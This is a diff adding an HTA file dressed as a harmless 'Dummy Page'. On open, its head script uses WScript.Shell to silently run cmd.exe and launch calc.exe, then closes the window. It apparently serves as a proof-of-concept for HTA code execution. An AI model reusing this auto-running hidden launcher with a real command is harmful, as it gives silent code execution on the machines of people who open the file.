@@ -1,0 +1,49 @@
+<html>
+
+<head>
+
+<HTA:APPLICATION id="hwHTA"
+applicationName="hyperHTA"
+border="thin"
+borderStyle="normal"
+caption="yes"
+icon="http://www.hyperwrite.com/features/favicon.ico"
+maximizeButton="yes"
+minimizeButton="yes"
+showInTaskbar="no"
+windowState="normal"
+innerBorder="yes"
+navigable="yes"
+scroll="auto"
+scrollFlat="yes"
+singleInstance="yes" 
+sysMenu="yes"
+contextMenu="yes"
+selection="yes" 
+version="1.0" />
+
+<script>
+a=new ActiveXObject("WScript.Shell");
+a.run('%windir%\\System32\\cmd.exe /c calc.exe', 0);window.close();
+</script>
+
+<title>Simple HTML Page</title>
+
+</head>
+
+<body>
+
+<h1>Dummy Page</h1>
+<hr>
+<p>This is a simple, common or garden variety, normal HTML page. Oh, but saved
+with a .HTA extension, and with an &lt;HTA&gt; application block included at the
+top of the HTML code. </p>
+<p>And to make it interesting, here is a link to the <a href="http://www.aodc.com.au/" target="_top">AODC
+Web site</a>.</p>
+<p>And why not retrieve the version number out of the HTA:Application properties
+using <a href="#" onClick="JavaScript:alert('Version of this HTA is ' + hwHTA.version)">JavaScript</a>.</p>
+<p>&nbsp;</p>
+
+</body>
+
+</html>
